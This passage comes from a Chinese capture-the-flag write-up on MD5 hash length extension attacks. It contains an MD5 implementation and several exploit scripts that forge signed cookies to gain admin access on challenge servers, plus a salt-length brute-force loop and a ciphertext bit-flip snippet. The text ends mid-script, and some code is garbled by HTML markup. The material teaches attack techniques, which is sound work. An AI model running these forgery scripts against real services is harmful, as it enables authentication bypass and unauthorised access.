class="hljs-number">0xfde5380c</span>)<br>        a=HH(a,b,c,d,M1,<span class="hljs-number">4</span>,<span class="hljs-number">0xa4beea44L</span>)<br>        d=HH(d,a,b,c,M4,<span class="hljs-number">11</span>,<span class="hljs-number">0x4bdecfa9L</span>)<br>        c=HH(c,d,a,b,M7,<span class="hljs-number">16</span>,<span class="hljs-number">0xf6bb4b60L</span>)<br>        b=HH(b,c,d,a,M10,<span class="hljs-number">23</span>,<span class="hljs-number">0xbebfbc70L</span>)<br>        a=HH(a,b,c,d,M13,<span class="hljs-number">4</span>,<span class="hljs-number">0x289b7ec6L</span>)<br>        d=HH(d,a,b,c,M0,<span class="hljs-number">11</span>,<span class="hljs-number">0xeaa127faL</span>)<br>        c=HH(c,d,a,b,M3,<span class="hljs-number">16</span>,<span class="hljs-number">0xd4ef3085L</span>)<br>        b=HH(b,c,d,a,M6,<span class="hljs-number">23</span>,<span class="hljs-number">0x04881d05L</span>)<br>        a=HH(a,b,c,d,M9,<span class="hljs-number">4</span>,<span class="hljs-number">0xd9d4d039L</span>)<br>        d=HH(d,a,b,c,M12,<span class="hljs-number">11</span>,<span class="hljs-number">0xe6db99e5L</span>)<br>        c=HH(c,d,a,b,M15,<span class="hljs-number">16</span>,<span class="hljs-number">0x1fa27cf8L</span>)<br>        b=HH(b,c,d,a,M2,<span class="hljs-number">23</span>,<span class="hljs-number">0xc4ac5665L</span>)<br>        <span class="hljs-comment">#Fourth round</span><br>        a=II(a,b,c,d,M0,<span class="hljs-number">6</span>,<span class="hljs-number">0xf4292244L</span>)<br>        d=II(d,a,b,c,M7,<span class="hljs-number">10</span>,<span class="hljs-number">0x432aff97L</span>)<br>        c=II(c,d,a,b,M14,<span class="hljs-number">15</span>,<span class="hljs-number">0xab9423a7L</span>)<br>        b=II(b,c,d,a,M5,<span class="hljs-number">21</span>,<span class="hljs-number">0xfc93a039L</span>)<br>        a=II(a,b,c,d,M12,<span class="hljs-number">6</span>,<span class="hljs-number">0x655b59c3L</span>)<br>        d=II(d,a,b,c,M3,<span class="hljs-number">10</span>,<span class="hljs-number">0x8f0ccc92L</span>)<br>        c=II(c,d,a,b,M10,<span class="hljs-number">15</span>,<span class="hljs-number">0xffeff47dL</span>)<br>        b=II(b,c,d,a,M1,<span class="hljs-number">21</span>,<span class="hljs-number">0x85845dd1L</span>)<br>        a=II(a,b,c,d,M8,<span class="hljs-number">6</span>,<span class="hljs-number">0x6fa87e4fL</span>)<br>        d=II(d,a,b,c,M15,<span class="hljs-number">10</span>,<span class="hljs-number">0xfe2ce6e0L</span>)<br>        c=II(c,d,a,b,M6,<span class="hljs-number">15</span>,<span class="hljs-number">0xa3014314L</span>)<br>        b=II(b,c,d,a,M13,<span class="hljs-number">21</span>,<span class="hljs-number">0x4e0811a1L</span>)<br>        a=II(a,b,c,d,M4,<span class="hljs-number">6</span>,<span class="hljs-number">0xf7537e82L</span>)<br>        d=II(d,a,b,c,M11,<span class="hljs-number">10</span>,<span class="hljs-number">0xbd3af235L</span>)<br>        c=II(c,d,a,b,M2,<span class="hljs-number">15</span>,<span class="hljs-number">0x2ad7d2bbL</span>)<br>        b=II(b,c,d,a,M9,<span class="hljs-number">21</span>,<span class="hljs-number">0xeb86d391L</span>)<br><br><br>        A += a<br>        B += b<br>        C += c<br>        D += d<br><br>        A = A&amp;<span class="hljs-number">0xffffffff</span><br>        B = B&amp;<span class="hljs-number">0xffffffff</span><br>        C = C&amp;<span class="hljs-number">0xffffffff</span><br>        D = D&amp;<span class="hljs-number">0xffffffff</span><br><br>        a = A<br>        b = B<br>        c = C<br>        d = D<br><br>    <span class="hljs-keyword">return</span> show_md5(a,b,c,d)</code></pre><br><h2 id="0x2-计算脚本">0x2 计算脚本</h2><br><pre class="prettyprint"><code class=" hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -<em>- coding: utf-8 -</em>-</span><br><span class="hljs-comment"># @Author：DshtAnger</span><br><span class="hljs-keyword">import</span> my_md5<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, long_to_bytes, bytes_to_long<br><span class="hljs-comment">#reference:</span><br><span class="hljs-comment">#   <a href="http://www.freebuf.com/articles/web/69264.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/69264.html</a></span><br><span class="hljs-comment">#problem link:</span><br><span class="hljs-comment">#   <a href="http://ctf4.shiyanbar.com/web/kzhan.php" target="_blank" rel="external">http://ctf4.shiyanbar.com/web/kzhan.php</a></span><br>samplehash=<span class="hljs-string">“ec82a52bac65135157dfa73daa3548b1”</span><br><br><span class="hljs-string">‘’’<br>res = re.findall(‘.{8}’,samplehash)<br>print res<br><br>s = ‘03194d72’<br>print c<br>s1 = “”<br>print s1.join([s[i-2]+s[i-1] for i in xrange(len(s),0,-2)])<br>‘’’</span><br>s =[]<br>res = re.findall(<span class="hljs-string">‘.{8}’</span>,samplehash)<br><span class="hljs-keyword">print</span> res<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:<br>    ss = <span class="hljs-string">“”</span><br><br>    ss = ss.join([i[j-<span class="hljs-number">2</span>]+i[j-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> xrange(len(i),<span class="hljs-number">0</span>,-<span class="hljs-number">2</span>)])<br><br>    s.append(bytes_to_long(binascii.a2b_hex(ss)))<br><span class="hljs-keyword">print</span> [hex(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s]<br><span class="hljs-comment"># 084e0343 a0486ff0 5530df6c 705c8bb4</span><br><span class="hljs-comment">#将哈希值分为四段,并反转该四字节为小端序,作为64第二次循环的输入幻书</span><br><br>s1=s[<span class="hljs-number">0</span>]<br>s2=s[<span class="hljs-number">1</span>]<br>s3=s[<span class="hljs-number">2</span>]<br>s4=s[<span class="hljs-number">3</span>]<br><span class="hljs-comment">#exp</span><br>secret = <span class="hljs-string">“a”</span><em><span class="hljs-number">15</span><br>secret_admin=<span class="hljs-string">“xxxxxguest”</span>+<span class="hljs-string">‘\x80’</span>+<span class="hljs-string">‘\x00’</span></em><span class="hljs-number">45</span>+<span class="hljs-string">‘\x50’</span>+<span class="hljs-string">‘\x00’</span><em><span class="hljs-number">7</span>+<span class="hljs-string">“admin”</span><br>r = my_md5.deal_rawInputMsg(secret_admin)<br>inp = r[len(r)/<span class="hljs-number">2</span>:]      <span class="hljs-comment">#我们需要截断的地方，也是我们需要控制的地方</span><br><span class="hljs-comment">#print r</span><br><span class="hljs-comment">#print inp</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">“getmein:”</span>+my_md5.run_md5(s1,s2,s3,s4,inp)<br><span class="hljs-keyword">print</span> <span class="hljs-string">“getmein:”</span>+hashlib.md5(secret_admin).hexdigest()</em></code></pre><br><h1 id="0x03-实例演示">0x03 实例演示</h1><br><h2 id="0x1-简单实例">0x1 简单实例</h2><br><pre class="prettyprint"><code class=" hljs xml"><span class="php"><span class="hljs-preprocessor">&lt;?php</span><br><span class="hljs-variable">$SECRET</span>=<span class="hljs-string">“xxxxx”</span>;<br><span class="hljs-variable">$auth</span> = <span class="hljs-string">“guest”</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">“auth”</span>])) {<br>    <span class="hljs-variable">$hsh</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">“hsh”</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$hsh</span> === md5(<span class="hljs-variable">$SECRET</span> . <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">“auth”</span>])) {<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">“flag{I_L0vE_L0li}”</span>);<br>    }<br>} <span class="hljs-keyword">else</span> {<br>    setcookie(<span class="hljs-string">“auth”</span>, <span class="hljs-variable">$auth</span>);<br>    setcookie(<span class="hljs-string">“hsh”</span>, md5(<span class="hljs-variable">$SECRET</span>.<span class="hljs-variable">$auth</span>));<br>}<br><span class="hljs-preprocessor">?&gt;</span></span></code></pre><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170704005525497?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><pre class="prettyprint"><code class=" hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -- coding: utf-8 -<em>-</em></span><br><span class="hljs-comment"># @Author：DshtAnger</span><br><span class="hljs-keyword">import</span> my_md5<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, long_to_bytes, bytes_to_long<br><span class="hljs-comment">#reference:</span><br><span class="hljs-comment">#   <a href="http://www.freebuf.com/articles/web/69264.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/69264.html</a></span><br><span class="hljs-comment">#problem link:</span><br><span class="hljs-comment">#   <a href="http://ctf4.shiyanbar.com/web/kzhan.php" target="_blank" rel="external">http://ctf4.shiyanbar.com/web/kzhan.php</a></span><br>samplehash=<span class="hljs-string">“06be518adbb45a90440c98bb364d4cf8”</span><br><br><span class="hljs-string">‘’’<br>res = re.findall(‘.{8}’,samplehash)<br>print res<br><br>s = ‘03194d72’<br>print c<br>s1 = “”<br>print s1.join([s[i-2]+s[i-1] for i in xrange(len(s),0,-2)])<br>‘’’</span><br>s =[]<br>res = re.findall(<span class="hljs-string">‘.{8}’</span>,samplehash)<br><span class="hljs-keyword">print</span> res<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:<br>    ss = <span class="hljs-string">“”</span><br><br>    ss = ss.join([i[j-<span class="hljs-number">2</span>]+i[j-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> xrange(len(i),<span class="hljs-number">0</span>,-<span class="hljs-number">2</span>)])<br><br>    s.append(bytes_to_long(binascii.a2b_hex(ss)))<br><span class="hljs-keyword">print</span> [hex(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s]<br><span class="hljs-comment"># 084e0343 a0486ff0 5530df6c 705c8bb4</span><br><span class="hljs-comment">#将哈希值分为四段,并反转该四字节为小端序,作为64第二次循环的输入幻书</span><br><br>s1=s[<span class="hljs-number">0</span>]<br>s2=s[<span class="hljs-number">1</span>]<br>s3=s[<span class="hljs-number">2</span>]<br>s4=s[<span class="hljs-number">3</span>]<br><span class="hljs-comment">#exp</span><br>secret = <span class="hljs-string">“a”</span><span class="hljs-number">15</span><br>secret_admin=<span class="hljs-string">“yyyyyyyyzzzzzzzadminadmin”</span>+<span class="hljs-string">‘\x80’</span>+<span class="hljs-string">‘\x00’</span><em><span class="hljs-number">30</span>+<span class="hljs-string">‘\xc8’</span>+<span class="hljs-string">‘\x00’</span></em><span class="hljs-number">7</span>+<span class="hljs-string">“admin”</span><br>r = my_md5.deal_rawInputMsg(secret_admin)<br>inp = r[len(r)/<span class="hljs-number">2</span>:]      <span class="hljs-comment">#我们需要截断的地方，也是我们需要控制的地方</span><br><span class="hljs-comment">#print r</span><br><span class="hljs-comment">#print inp</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">“getmein:”</span>+my_md5.run_md5(s1,s2,s3,s4,inp)<br><span class="hljs-keyword">print</span> <span class="hljs-string">“getmein:”</span>+hashlib.md5(secret_admin).hexdigest()</code></pre><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170704011612940?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>自己写个访问脚本就可以获取flag<br></p><br><pre class="prettyprint"><code class=" hljs ruby">import requests<br>se = requests.session()<br>cookies = {<br>    <span class="hljs-string">‘hsh’</span><span class="hljs-symbol">:<span class="hljs-string">‘9b012140133ad92facec4f297bcd2d92’</span></span>,<br>    <span class="hljs-string">‘auth’</span><span class="hljs-symbol">:<span class="hljs-string">“admin”</span>+<span class="hljs-string">‘\x80’</span>+<span class="hljs-string">‘\x00’</span><em></em></span><span class="hljs-number">30</span>+<span class="hljs-string">‘\xc8’</span>+<span class="hljs-string">‘\x00’</span><span class="hljs-number">7</span>+<span class="hljs-string">“admin”</span><br>}<br>re = se.post(url=<span class="hljs-string">“<a href="http://45.78.29.252/hash.php" target="_blank" rel="external">http://45.78.29.252/hash.php</a>“</span>,cookies=cookies)<br>print re.content<br></code></pre><br><p>当然也可以直接用burp</p><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170704012700711?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><h2 id="0x2-jarvisoj-flag在管理员手里">0x2 jarvisoj flag在管理员手里</h2><br><p>首先我介绍一个开源工具<a href="https://github.com/iagox86/hash_extender" target="_blank" rel="external">hash_extender</a> <br><br>具体的使用方法我这里就不在介绍了 主要介绍一下使用参数<br></p><br><pre class="prettyprint"><code class=" hljs haml">-<span class="ruby">d 被扩展的明文<br></span>-<span class="ruby">a 附加的到原来hash的padding<br></span>-<span class="ruby">l 盐的长度<br></span>-<span class="ruby">f 加密方式<br></span>-<span class="ruby">s 带盐加密的hash值<br></span>-<span class="ruby">-out-data-format 输出格式<br></span>-<span class="ruby">-quiet 仅输出必要的值</span></code></pre><br><p>题目中有备份文件泄露所以 <br><br>利用vim恢复一下方法是，首先重命名为.index.php.swp,接着利用vim -r index.php即可恢复 <br><br>源码如下<br><br></p><br><pre class="prettyprint"><code class=" hljs handlebars"><span class="xml"><span class="hljs-doctype">&lt;!DOCTYPE html&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">title</span>&gt;</span>Web 350<span class="hljs-tag">&lt;/<span class="hljs-title">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">style</span> <span class="hljs-attribute">type</span>=<span class="hljs-value">“text/css”</span>&gt;</span><span class="css"><br>    <span class="hljs-tag">body</span> <span class="hljs-rules">{<br>        <span class="hljs-rule"><span class="hljs-attribute">background</span>:<span class="hljs-value">gray</span></span>;<br>        <span class="hljs-rule"><span class="hljs-attribute">text-align</span>:<span class="hljs-value">center</span></span>;<br>    <span class="hljs-rule">}</span></span><br></span><span class="hljs-tag">&lt;/<span class="hljs-title">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-title">body</span>&gt;</span><br>    <span class="php"><span class="hljs-preprocessor">&lt;?php</span><br>        <span class="hljs-variable">$auth</span> = <span class="hljs-keyword">false</span>;<br>        <span class="hljs-variable">$role</span> = <span class="hljs-string">“guest”</span>;<br>        <span class="hljs-variable">$salt</span> =<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">“role”</span>])) {<br>            <span class="hljs-variable">$role</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">“role”</span>]);<br>            <span class="hljs-variable">$hsh</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">“hsh”</span>];<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$role</span>===<span class="hljs-string">“admin”</span> &amp;&amp; <span class="hljs-variable">$hsh</span> === md5(<span class="hljs-variable">$salt</span>.strrev(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">“role”</span>]))) {<br>                <span class="hljs-variable">$auth</span> = <span class="hljs-keyword">true</span>;<br>            } <span class="hljs-keyword">else</span> {<br>                <span class="hljs-variable">$auth</span> = <span class="hljs-keyword">false</span>;<br>            }<br>        } <span class="hljs-keyword">else</span> {<br>            <span class="hljs-variable">$s</span> = serialize(<span class="hljs-variable">$role</span>);<br>            setcookie(<span class="hljs-string">‘role’</span>,<span class="hljs-variable">$s</span>);<br>            <span class="hljs-variable">$hsh</span> = md5(<span class="hljs-variable">$salt</span>.strrev(<span class="hljs-variable">$s</span>));<br>            setcookie(<span class="hljs-string">‘hsh’</span>,<span class="hljs-variable">$hsh</span>);<br>        }<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$auth</span>) {<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">“&lt;h3&gt;Welcome Admin. Your flag is<br>        } else {<br>            echo “</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="hljs-string">“;<br>        }<br>    ?&gt;</span></span><br><br><span class="hljs-tag">&lt;/<span class="hljs-title">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">html</span>&gt;</span><br></span></code></pre><br><h3 id="方法一-利用hashextender">方法一 利用hash_extender</h3><br><pre class="prettyprint"><code class=" hljs python"><span class="hljs-comment"># -<em>- coding:utf-8 -</em>-</span><br><span class="hljs-keyword">from</span> urlparse <span class="hljs-keyword">import</span> urlparse<br><span class="hljs-keyword">from</span> httplib <span class="hljs-keyword">import</span> HTTPConnection<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> urlencode<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> urllib<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gao</span><span class="hljs-params">(x, y)</span>:</span><br>        <span class="hljs-comment">#print x</span><br>        <span class="hljs-comment">#print y</span><br>    url = <span class="hljs-string">“<a href="http://120.26.131.152:32778/" target="_blank" rel="external">http://120.26.131.152:32778/</a>“</span><br>    cookie = <span class="hljs-string">“role=”</span> + x + <span class="hljs-string">“; hsh=”</span> + y<br>        <span class="hljs-comment">#print cookie</span><br>    build_header = {<br>            <span class="hljs-string">‘Cookie’</span>: cookie,<br>            <span class="hljs-string">‘User-Agent’</span>: <span class="hljs-string">‘Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0’</span>,<br>            <span class="hljs-string">‘Host’</span>: <span class="hljs-string">‘web.phrack.top:32785’</span>,<br>            <span class="hljs-string">‘Accept’</span>: <span class="hljs-string">‘text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8’</span>,<br>    }<br>    urlparts = urlparse(url)<br>    conn = HTTPConnection(urlparts.hostname, urlparts.port <span class="hljs-keyword">or</span> <span class="hljs-number">80</span>)<br>    conn.request(<span class="hljs-string">“GET”</span>, urlparts.path, <span class="hljs-string">‘’</span>, build_header)<br>    resp = conn.getresponse()<br>    body = resp.read()<br>    <span class="hljs-keyword">return</span> body<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1000</span>):<br>    <span class="hljs-keyword">print</span> i<br>    <span class="hljs-comment">#secret len = ???</span><br>    find_hash = <span class="hljs-string">“../hash_extender/hash_extender -d ‘;\”tseug\”:5:s’ -s 3a4727d57463f122833d9e732f94e4e0 -f md5  -a ‘;\”nimda\”:5:s’ –out-data-format=html -l “</span> + str(i) + <span class="hljs-string">“ –quiet”</span><br>    <span class="hljs-comment">#print find_hash</span><br>    calc_res = os.popen(find_hash).readlines()<br>    <span class="hljs-keyword">print</span> calc_res<br>    hash_value = calc_res[<span class="hljs-number">0</span>][:<span class="hljs-number">32</span>]<br>    attack_padding = calc_res[<span class="hljs-number">0</span>][<span class="hljs-number">32</span>:]<br>    attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-<span class="hljs-number">1</span>])<br>    ret = gao(attack_padding, hash_value)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">“Welcome”</span> <span class="hljs-keyword">in</span> ret:<br>        <span class="hljs-keyword">print</span> ret<br>        <span class="hljs-keyword">break</span><br><br><br></code></pre><br><h3 id="方法二-利用上述脚本">方法二 利用上述脚本</h3><br><p>只需简单的更改第二个脚本就好</p><br><pre class="prettyprint"><code class=" hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -<em>- coding: utf-8 -</em>-</span><br><span class="hljs-comment"># @Author：DshtAnger</span><br><span class="hljs-keyword">import</span> test1<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, long_to_bytes, bytes_to_long<br><span class="hljs-comment">#reference:</span><br><span class="hljs-comment">#   <a href="http://www.freebuf.com/articles/web/69264.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/69264.html</a></span><br><span class="hljs-comment">#problem link:</span><br><span class="hljs-comment">#   <a href="http://ctf4.shiyanbar.com/web/kzhan.php" target="_blank" rel="external">http://ctf4.shiyanbar.com/web/kzhan.php</a></span><br>samplehash=<span class="hljs-string">“3a4727d57463f122833d9e732f94e4e0”</span><br><br><span class="hljs-string">‘’’<br>res = re.findall(‘.{8}’,samplehash)<br>print res<br><br>s = ‘03194d72’<br>print c<br>s1 = “”<br>print s1.join([s[i-2]+s[i-1] for i in xrange(len(s),0,-2)])<br>‘’’</span><br>s =[]<br>res = re.findall(<span class="hljs-string">‘.{8}’</span>,samplehash)<br><span class="hljs-keyword">print</span> res<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:<br>    ss = <span class="hljs-string">“”</span><br><br>    ss = ss.join([i[j-<span class="hljs-number">2</span>]+i[j-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> xrange(len(i),<span class="hljs-number">0</span>,-<span class="hljs-number">2</span>)])<br><br>    s.append(bytes_to_long(binascii.a2b_hex(ss)))<br><span class="hljs-keyword">print</span> [hex(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s]<br><span class="hljs-comment"># 084e0343 a0486ff0 5530df6c 705c8bb4</span><br><span class="hljs-comment">#将哈希值分为四段,并反转该四字节为小端序,作为64第二次循环的输入幻书</span><br><br>s1=s[<span class="hljs-number">0</span>]<br>s2=s[<span class="hljs-number">1</span>]<br>s3=s[<span class="hljs-number">2</span>]<br>s4=s[<span class="hljs-number">3</span>]<br><span class="hljs-comment">#exp</span><br><br>secret_admin=<span class="hljs-string">‘xxxxxxxxxxxx;”tseug”:5:s’</span>+<span class="hljs-string">‘\x80’</span>+<span class="hljs-string">‘\x00’</span><em><span class="hljs-number">31</span>+<span class="hljs-string">‘\x18’</span>+<span class="hljs-string">‘\x00’</span></em><span class="hljs-number">7</span>+<span class="hljs-string">‘;”nimda”:5:s’</span><br>r = test1.deal_rawInputMsg(secret_admin)<br>inp = r[len(r)/<span class="hljs-number">2</span>:]      <span class="hljs-comment">#我们需要截断的地方，也是我们需要控制的地方</span><br><span class="hljs-comment">#print r;”tseug”:5:s</span><br><span class="hljs-comment">#print inp</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">“getmein:”</span>+test1.run_md5(s1,s2,s3,s4,inp)<br><span class="hljs-keyword">print</span> <span class="hljs-string">“getmein:”</span>+hashlib.md5(secret_admin).hexdigest()</code></pre><br><p>代码中的xxxxx就是salt 但是首先我们要猜测长度 所以可以利用脚本写一个简单的爆破</p><br><h2 id="0x3-admin">0x3 admin</h2><br><p>这道题目也是不错的考察了，hash扩展攻击技巧以及aes的相关加密方式</p><br><p>题目我已经上传到github上面了<a href="https://github.com/actionyz/Web/tree/master/web%E5%AF%86%E7%A0%81%EF%BC%88hash%20extend%20aes%20cfb%E5%8A%A0%E5%AF%86%EF%BC%89" target="_blank" rel="external">链接</a></p><br><p>主要还是代码审计</p><br><h3 id="step-1-初步审计">step 1 初步审计</h3><br><ol><br><li>访问backup_old.php会生成flag的加密内容</li><br><li>index.php提供注册登录解密等功能</li><br><li>要想实现解密必须是的admin的值为1</li><br></ol><br><h3 id="step-2-直接解密解法一">step 2 直接解密(解法一)</h3><br><p>这里需要注意一下aes加密解密，是要16字节填充的。所以要控制一下用户名长度</p><br><p>我们注册 <br><br><code>username = xxxxxxxadmin|1|501530457b49501056d8f994d12252ca</code> <br><br>就会得到加密的内容我们取前96位，因为明文已知所以最后一位字节翻转<br><br></p><br><pre class="prettyprint"><code class=" hljs perl">import binascii<br><span class="hljs-keyword">s</span> = <span class="hljs-string">‘7bbb9e011044a910a7c78694894637b75baf41106081282d35d171253cadcbbf24498a58a9ac5e5bdba9ed1c3f3badf6e5844ea87f28680454a847808321da8ce581b67e0c24bc6cab79cf8c9ce16074ae8a01456f3921f8a4bd654ceaf9da51’</span><br>string = <span class="hljs-keyword">s</span>[<span class="hljs-number">0</span>:<span class="hljs-number">96</span>]<br>last_8 = binascii.a2b_hex(string[-<span class="hljs-number">2</span>:])<br><span class="hljs-keyword">print</span> len(last_8)<br>plain = <span class="hljs-string">‘|’</span><br>mid = <span class="hljs-string">‘’</span>.<span class="hljs-keyword">join</span>([<span class="hljs-keyword">chr</span>(<span class="hljs-keyword">ord</span>(last_8[i])^<span class="hljs-keyword">ord</span>(plain[i])) <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">1</span>)])<br>final = <span class="hljs-string">‘’</span>.<span class="hljs-keyword">join</span>([<span class="hljs-keyword">chr</span>(<span class="hljs-keyword">ord</span>(mid[i])^<span class="hljs-keyword">ord</span>(<span class="hljs-string">‘\x01’</span>)) <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">1</span>)])<br><span class="hljs-keyword">print</span> string[:-<span class="hljs-number">2</span>]+binascii.b2a_hex(final)<br></code></pre><br><p>将<code>token=</code> <br><br><code>login=501530457b49501056d8f994d12252ca</code><br></p><br><h3 id="step-3-利用hash拓展攻击没有必要">step 3 利用hash拓展攻击（没有必要）</h3><br><p>贴上脚本，hash生成还是以前的脚本</p><br><pre class="prettyprint"><code class=" hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> re<br>url_register = <span class="hljs-string">‘<a href="http://127.0.0.1/var/index.php?action=register" target="_blank" rel="external">http://127.0.0.1/var/index.php?action=register</a>‘</span><br>url_login = <span class="hljs-string">‘<a href="http://127.0.0.1/var/index.php?action=login" target="_blank" rel="external">http://127.0.0.1/var/index.php?action=login</a>‘</span><br>url_manage = <span class="hljs-string">‘<a href="http://127.0.0.1/var/index.php?action=manage" target="_blank" rel="external">http://127.0.0.1/var/index.php?action=manage</a>‘</span><br>url_back = <span class="hljs-string">‘<a href="http://127.0.0.1/var/backup_old.php" target="_blank" rel="external">http://127.0.0.1/var/backup_old.php</a>‘</span><br>re1 = requests.session()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">register</span><span class="hljs-params">(name,passwd)</span>:</span><br>    data = {<br>    <span class="hljs-string">‘user’</span>:name,<br>    <span class="hljs-string">‘pwd’</span>:passwd<br>    }<br>    re1.post(url_register,data=data)<br><br><span class="hljs-comment"># login(‘kk’,’kk’)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span><span class="hljs-params">(name,passwd)</span>:</span><br>    data = {<br>    <span class="hljs-string">‘user’</span>:name,<br>    <span class="hljs-string">‘pwd’</span>:passwd<br>    }<br>    s = re1.post(url_login,data=data,allow_redirects=<span class="hljs-keyword">False</span>)<br>    <span class="hljs-comment"># print s.content</span><br>    <span class="hljs-keyword">return</span>  s.cookies<br><br>token_fl = <span class="hljs-string">‘’</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">attack</span><span class="hljs-params">(token,sign)</span>:</span><br>    <span class="hljs-keyword">global</span> token_fl<br><br>    cookies ={<br>    <span class="hljs-string">‘sign’</span>:sign,<br>    <span class="hljs-string">‘token’</span>:token,<br>    }<br><br>    s = re1.post(url_manage,data={<span class="hljs-string">‘do’</span>:<span class="hljs-string">‘decrypt’</span>},cookies=cookies)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">‘Password’</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> s.content:<br>        token_fl = token<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">(token,sign)</span>:</span><br>    re1.post(url_back)<br>    srand = int(time.time())<br>    r = re1.post(<span class="hljs-string">‘<a href="http://127.0.0.1/var/backup.txt" target="_blank" rel="external">http://127.0.0.1/var/backup.txt</a>‘</span>)<br>    encrypt = r.content<br>    r = re1.post(<span class="hljs-string">‘<a href="http://127.0.0.1/2.php" target="_blank" rel="external">http://127.0.0.1/2.php</a>‘</span>,data={<span class="hljs-string">‘a’</span>:srand})<br>    st = r.content<br>    string = <span class="hljs-string">‘’</span>.join([hex(ord(i))[<span class="hljs-number">2</span>:] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> st])<br>    <span class="hljs-keyword">print</span> st,string<br>    cookies ={<br>    <span class="hljs-string">‘sign’</span>:sign,<br>    <span class="hljs-string">‘token’</span>:token,<br>    }<br>    s = re1.post(url_manage,data={<span 